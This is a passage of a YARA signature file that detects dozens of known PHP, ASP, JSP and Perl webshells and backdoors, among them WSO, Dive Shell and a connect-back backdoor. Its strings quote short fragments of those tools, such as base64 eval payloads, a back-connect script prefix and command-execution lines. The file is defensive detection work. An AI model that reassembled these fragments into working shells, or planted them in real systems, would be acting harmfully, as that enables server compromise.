		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4174-L4186"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "d42aec2891214cace99b3eb9f3e21a63"
		logic_hash = "dbd825e1056c41efaf80c0495ba7b6cf1c88403b997ea7ac1378512a19f7ed8a"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "SooMin Kim"
		$s1 = "smkim@popeye.snu.ac.kr"
		$s2 = "echo \"<td><a href='$PHP_SELF?action=deleteData&dbname=$dbname&tablename=$tablen"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Dive_Shell_1_0___Emperor_Hacking_Team_Php_1
{
	meta:
		description = "Semi-Auto-generated  - file Dive Shell 1.0 - Emperor Hacking Team.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "d75294a4-a0a7-5c74-bb7a-766db477633c"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4187-L4200"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "1b5102bdc41a7bc439eea8f0010310a5"
		logic_hash = "bd51b625359799178ad3c8e02ba5bb5fca89e6e14769b86dd35c2b8a1049599f"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Emperor Hacking TEAM"
		$s1 = "Simshell" fullword
		$s2 = "ereg('^[[:blank:]]*cd[[:blank:]]"
		$s3 = "<form name=\"shell\" action=\"<?php echo $_SERVER['PHP_SELF'] ?>\" method=\"POST"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Asmodeus_V0_1_Pl_1
{
	meta:
		description = "Semi-Auto-generated  - file Asmodeus v0.1.pl.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "cfd082a8-56fa-54bc-a683-c0052f78e12e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4201-L4214"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "0978b672db0657103c79505df69cb4bb"
		logic_hash = "be0130c9d2a5d29e6ef8749b0058c96c2ca1ecb9823fd14a8a2c82978cf3d104"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "[url=http://www.governmentsecurity.org"
		$s1 = "perl asmodeus.pl client 6666 127.0.0.1"
		$s2 = "print \"Asmodeus Perl Remote Shell"
		$s4 = "$internet_addr = inet_aton(\"$host\") or die \"ALOA:$!\\n\";" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Backup_Php_Often_With_C99Shell_1
{
	meta:
		description = "Semi-Auto-generated  - file backup.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "ce88027c-ae08-59f3-948d-6f3d58515468"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4215-L4227"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "aeee3bae226ad57baf4be8745c3f6094"
		logic_hash = "e27d00ebfbac2565568b9a97552a331db91b4e9aa318febb048937f5c3a1a1ba"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "#phpMyAdmin MySQL-Dump" fullword
		$s2 = ";db_connect();header('Content-Type: application/octetstr"
		$s4 = "$data .= \"#Database: $database" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Reader_Asp_1
{
	meta:
		description = "Semi-Auto-generated  - file Reader.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "70094d24-fa3a-503c-b9b6-294a883fc52c"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4228-L4240"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "ad1a362e0a24c4475335e3e891a01731"
		logic_hash = "ec0dc3b050d84e852e0c18bd00961f109d3506fa7f2e8656448bd5edd28d9305"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "Mehdi & HolyDemon"
		$s2 = "www.infilak."
		$s3 = "'*T@*r@#@&mms^PdbYbVuBcAAA==^#~@%><form method=post name=inf><table width=\"75%"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Phpshell17_Php_1
{
	meta:
		description = "Semi-Auto-generated  - file phpshell17.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "ea1f657c-2023-50bb-a2ee-33c53ee8fb5e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4241-L4253"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "9a928d741d12ea08a624ee9ed5a8c39d"
		logic_hash = "a9306747a5c9756f393c61562ed4a601c75c3a9491ad19a7b7dbae1fbd505e9a"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "<input name=\"submit_btn\" type=\"submit\" value=\"Execute Command\"></p>" fullword
		$s1 = "<title>[ADDITINAL TITTLE]-phpShell by:[YOURNAME]<?php echo PHPSHELL_VERSION ?></"
		$s2 = "href=\"mailto: [YOU CAN ENTER YOUR MAIL HERE]- [ADDITIONAL TEXT]</a></i>" fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_Myshell_Php_Php_1
{
	meta:
		description = "Semi-Auto-generated  - file myshell.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "eaf243cb-fa26-5f34-a724-60a08acff636"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4254-L4266"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "62783d1db52d05b1b6ae2403a7044490"
		logic_hash = "dd7b0fa637a8317986de0c2312b4b552f1110fb5a64590a9a21c854e5985fbb6"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "@chdir($work_dir) or ($shellOutput = \"MyShell: can't change directory."
		$s1 = "echo \"<font color=$linkColor><b>MyShell file editor</font> File:<font color"
		$s2 = " $fileEditInfo = \"&nbsp;&nbsp;:::::::&nbsp;&nbsp;Owner: <font color=$"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Jspshall_Jsp_1
{
	meta:
		description = "Semi-Auto-generated  - file jspshall.jsp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "4bccad33-d26e-52c2-b7f8-802f2c8f3889"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4281-L4293"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "efe0f6edaa512c4e1fdca4eeda77b7ee"
		logic_hash = "94c458d3f38ba21348b0202e2b81bbbc3859e97d64f101a9ea7ec6f036e38bc5"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "kj021320"
		$s1 = "case 'T':systemTools(out);break;"
		$s2 = "out.println(\"<tr><td>\"+ico(50)+f[i].getName()+\"</td><td> file"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Php_1
{
	meta:
		description = "Semi-Auto-generated  - file webshell.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4294-L4305"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "e425241b928e992bde43dd65180a4894"
		logic_hash = "7b0f4f4afde7dcb44c9d877a72c961f3666278ce28a24ae8068cfbc32639e307"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s2 = "<die(\"Couldn't Read directory, Blocked!!!\");"
		$s3 = "PHP Web Shell"

	condition:
		all of them
}

rule SIGNATURE_BASE_Rootshell_Php_1
{
	meta:
		description = "Semi-Auto-generated  - file rootshell.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "aec6621e-f23a-5f9f-91f1-d2f1b1ab58d0"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4306-L4319"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "265f3319075536030e59ba2f9ef3eac6"
		logic_hash = "f836dd1825dc84212d32a034c0dde45d60ccd1eb667018abb60d671b61192666"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "shells.dl.am"
		$s1 = "This server has been infected by $owner"
		$s2 = "<input type=\"submit\" value=\"Include!\" name=\"inc\"></p>"
		$s4 = "Could not write to file! (Maybe you didn't enter any text?)"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Connectback2_Pl_1
{
	meta:
		description = "Semi-Auto-generated  - file connectback2.pl.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "4ddebc62-17d2-577e-84bd-207367078327"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4320-L4332"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "473b7d226ea6ebaacc24504bd740822e"
		logic_hash = "7316c93f12dbbf6d0235601d8be88c199e37955507925222d00041d0ceaf01c7"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "#We Are: MasterKid, AleXutz, FatMan & MiKuTuL                                   "
		$s1 = "echo --==Userinfo==-- ; id;echo;echo --==Directory==-- ; pwd;echo; echo --==Shel"
		$s2 = "ConnectBack Backdoor"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Defacekeeper_0_2_Php_1
{
	meta:
		description = "Semi-Auto-generated  - file DefaceKeeper_0.2.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "671323e2-42cb-5ce0-9839-5d01c446471c"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4333-L4345"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "713c54c3da3031bc614a8a55dccd7e7f"
		logic_hash = "0ee3fed3441e9561867508e324d7a6b1808a8923513bf1c9b82f8238224c994c"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "target fi1e:<br><input type=\"text\" name=\"target\" value=\"index.php\"></br>" fullword
		$s1 = "eval(base64_decode(\"ZXZhbChiYXNlNjRfZGVjb2RlKCJhV2R1YjNKbFgzVnpaWEpmWVdKdmNuUW9"
		$s2 = "<img src=\"http://s43.radikal.ru/i101/1004/d8/ced1f6b2f5a9.png\" align=\"center"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Shells_PHP_Wso_1
{
	meta:
		description = "Semi-Auto-generated  - file wso.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "fdce6094-a88e-5da6-aeb0-bc97b15bf397"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4346-L4357"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "33e2891c13b78328da9062fbfcf898b6"
		logic_hash = "31ef69228b66b30300006f63b1e4d6e92c2512caca4bd915d418b48564b39c47"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "$back_connect_p=\"IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbi"
		$s3 = "echo '<h1>Execution PHP-code</h1><div class=content><form name=pf method=pos"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Backdoor1_Php_1
{
	meta:
		description = "Semi-Auto-generated  - file backdoor1.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "89f44a1c-8a42-58f6-9308-371f4e652bff"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4358-L4370"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "e1adda1f866367f52de001257b4d6c98"
		logic_hash = "7c8840dc91c16b9fa19fee16e0159a7f13db23c96596e18da0cdab07931ce35b"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "echo \"[DIR] <A HREF=\\\"\".$_SERVER['PHP_SELF'].\"?rep=\".realpath($rep.\".."
		$s2 = "class backdoor {"
		$s4 = "echo \"<a href=\\\"\".$_SERVER['PHP_SELF'].\"?copy=1\\\">Copier un fichier</a> <"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Elmaliseker_Asp_1
{
	meta:
		description = "Semi-Auto-generated  - file elmaliseker.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "7ecf3d5c-be91-579e-905b-5f2ad03a0e42"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4371-L4384"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "b32d1730d23a660fd6aa8e60c3dc549f"
		logic_hash = "969f0f12449375a9ebbb8a68fd4b3db395927416d5cceccdb7f2c64310430880"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "if Int((1-0+1)*Rnd+0)=0 then makeEmail=makeText(8) & \"@\" & makeText(8) & \".\""
		$s1 = "<form name=frmCMD method=post action=\"<%=gURL%>\">"
		$s2 = "dim zombie_array,special_array"
		$s3 = "http://vnhacker.org"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Indexer_Asp_1
{
	meta:
		description = "Semi-Auto-generated  - file indexer.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "84ff60f9-36f7-5d29-9f38-8088fb42582e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4385-L4396"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "9ea82afb8c7070817d4cdf686abe0300"
		logic_hash = "0a51f15bfb4289dcb70e1e0b96d100be12901ebf26ed9c0e543eda5f4aa91f1c"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "<td>Nereye :<td><input type=\"text\" name=\"nereye\" size=25></td><td><input typ"
		$s2 = "D7nD7l.km4snk`JzKnd{n_ejq;bd{KbPur#kQ8AAA==^#~@%>></td><td><input type=\"submit"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Dxshell_Php_Php_1
{
	meta:
		description = "Semi-Auto-generated  - file DxShell.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "b89930b7-acf3-5078-8429-d59e27e4b00c"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4397-L4408"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "33a2b31810178f4c2e71fbdeb4899244"
		logic_hash = "821f9295eba6119ad08349e769d1909cd7836b4e35795915e94095cf715dc6e5"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "print \"\\n\".'Tip: to view the file \"as is\" - open the page in <a href=\"'.Dx"
		$s2 = "print \"\\n\".'<tr><td width=100pt class=linelisting><nobr>POST (php eval)</td><"

	condition:
		1 of them
}

rule SIGNATURE_BASE_S72_Shell_V1_1_Coding_Html_1
{
	meta:
		description = "Semi-Auto-generated  - file s72 Shell v1.1 Coding.html.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "dfd3b80e-6245-5f74-9d6a-6006218891ac"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4409-L4421"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "c2e8346a5515c81797af36e7e4a3828e"
		logic_hash = "aef8840b72e5c435c11150007d6b3af2943126fefdc6df343d0f73755340e260"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Dizin</font></b></font><font face=\"Verdana\" style=\"font-size: 8pt\"><"
		$s1 = "s72 Shell v1.0 Codinf by Cr@zy_King"
		$s3 = "echo \"<p align=center>Dosya Zaten Bulunuyor</p>\""

	condition:
		1 of them
}

rule SIGNATURE_BASE_Kacak_Asp_1
{
	meta:
		description = "Semi-Auto-generated  - file kacak.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "1ae15174-b84a-5826-b768-7afed65196db"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4422-L4435"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "907d95d46785db21331a0324972dda8c"
		logic_hash = "8542a3985dff2d1eb42f4d2c9f30405a4817a8e30075225c518ec52381f1f7df"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Kacak FSO 1.0"
		$s1 = "if request.querystring(\"TGH\") = \"1\" then"
		$s3 = "<font color=\"#858585\">BuqX</font></a></font><font face=\"Verdana\" style="
		$s4 = "mailto:BuqX@hotmail.com"

	condition:
		1 of them
}

rule SIGNATURE_BASE_PHP_Backdoor_Connect_Pl_Php_1
{
	meta:
		description = "Semi-Auto-generated  - file PHP Backdoor Connect.pl.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "96c9258e-3894-5ee9-b52c-eb7ba7454416"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4436-L4448"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "57fcd9560dac244aeaf95fd606621900"
		logic_hash = "b141546f45767884f9c8b1cc4c09ea25f90c0f3a3633bfeecad78b60e7f20306"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "LorD of IRAN HACKERS SABOTAGE"
		$s1 = "LorD-C0d3r-NT"
		$s2 = "echo --==Userinfo==-- ;"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Antichat_Socks5_Server_Php_Php_1
{
	meta:
		description = "Semi-Auto-generated  - file Antichat Socks5 Server.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "35d0930c-ef07-5fd4-9d7a-c0d685f92339"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4449-L4461"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "cbe9eafbc4d86842a61a54d98e5b61f1"
		logic_hash = "d6b203561f95f431b3d2c241011ae08c05619d45c5900a28137481c029e8297e"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "$port = base_convert(bin2hex(substr($reqmessage[$id], 3+$reqlen+1, 2)), 16, 10);" fullword
		$s3 = "#   [+] Domain name address type"
		$s4 = "www.antichat.ru"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Antichat_Shell_V1_3_Php_1
{
	meta:
		description = "Semi-Auto-generated  - file Antichat Shell v1.3.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "856cf977-24da-58e0-b6d2-820c92075ecc"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4462-L4474"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "40d0abceba125868be7f3f990f031521"
		logic_hash = "566c324f3bf44ce9f32ddad82a8d3daa87a8a75b5ca0c8286bc912a8ae4ac8e9"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Antichat"
		$s1 = "Can't open file, permission denide"
		$s2 = "$ra44"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Safe_Mode_Bypass_PHP_4_4_2_And_PHP_5_1_2_Php_1
{
	meta:
		description = "Semi-Auto-generated  - file Safe_Mode Bypass PHP 4.4.2 and PHP 5.1.2.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "3e81f628-31b4-5c22-943e-62c8cb4c0c4d"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4475-L4487"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "49ad9117c96419c35987aaa7e2230f63"
		logic_hash = "d6d2a3999f2e8ceb70f57697c0a845edbbcfce0aba151ec6a0ac23f55265cd47"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Welcome.. By This script you can jump in the (Safe Mode=ON) .. Enjoy"
		$s1 = "Mode Shell v1.0</font></span>"
		$s2 = "has been already loaded. PHP Emperor <xb5@hotmail."

	condition:
		1 of them
}

rule SIGNATURE_BASE_Mysql_Php_Php_1
{
	meta:
		description = "Semi-Auto-generated  - file mysql.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "41730336-0dce-5ed9-95b0-c911a4e3cb48"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4488-L4500"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "12bbdf6ef403720442a47a3cc730d034"
		logic_hash = "60e235310f378698ffcc3ae6a07ab5dd94a660ca4b1504cc878d9741f751d5d1"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "action=mysqlread&mass=loadmass\">load all defaults"
		$s2 = "if (@passthru($cmd)) { echo \" -->\"; $this->output_state(1, \"passthru"
		$s3 = "$ra44  = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = "

	condition:
		1 of them
}

rule SIGNATURE_BASE_Worse_Linux_Shell_Php_1
{
	meta:
		description = "Semi-Auto-generated  - file Worse Linux Shell.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "e223e2a9-7c7a-597a-8b90-a63ee11805ea"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4501-L4512"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "8338c8d9eab10bd38a7116eb534b5fa2"
		logic_hash = "47801296b700e85f9e08857eb06f845ef8ed3f88b7d0de34d4b7c47cef6cc7fb"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "print \"<tr><td><b>Server is:</b></td><td>\".$_SERVER['SERVER_SIGNATURE'].\"</td"
		$s2 = "print \"<tr><td><b>Execute command:</b></td><td><input size=100 name=\\\"_cmd"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Cyberlords_Sql_Php_Php_1
{
	meta:
		description = "Semi-Auto-generated  - file cyberlords_sql.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "41730336-0dce-5ed9-95b0-c911a4e3cb48"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4513-L4526"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "03b06b4183cb9947ccda2c3d636406d4"
		logic_hash = "b3286f9fd86c90c5afc79801b6d65c9ae52ee1c37da93ff15461d84f37ef8019"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Coded by n0 [nZer0]"
		$s1 = " www.cyberlords.net"
		$s2 = "U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAAMUExURf///wAAAJmZzAAAACJoURkAAAAE"
		$s3 = "return \"<BR>Dump error! Can't write to \".htmlspecialchars($file);"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Cmd_Asp_5_1_Asp_1
{
	meta:
		description = "Semi-Auto-generated  - file cmd-asp-5.1.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "fc204ab8-892d-5435-a737-a185ca32e938"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4527-L4538"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "8baa99666bf3734cbdfdd10088e0cd9f"
		logic_hash = "a41c83da1a65e67b6f4ac6ad7cc8702486957ab0c7dda658d071e603338c324b"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Call oS.Run(\"win.com cmd.exe /c del \"& szTF,0,True)" fullword
		$s3 = "Call oS.Run(\"win.com cmd.exe /c \"\"\" & szCMD & \" > \" & szTF &" fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_Pws_Php_Php_1
{
	meta:
		description = "Semi-Auto-generated  - file pws.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "1ec47c33-dbec-50bd-b4b0-8f00b704a816"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4539-L4551"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "ecdc6c20f62f99fa265ec9257b7bf2ce"
		logic_hash = "98dae8aab5bfd58f4264e318f5a5b5900b38687386f9d7f09c31da0f51d57bc0"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "<div align=\"left\"><font size=\"1\">Input command :</font></div>" fullword
		$s1 = "<input type=\"text\" name=\"cmd\" size=\"30\" class=\"input\"><br>" fullword
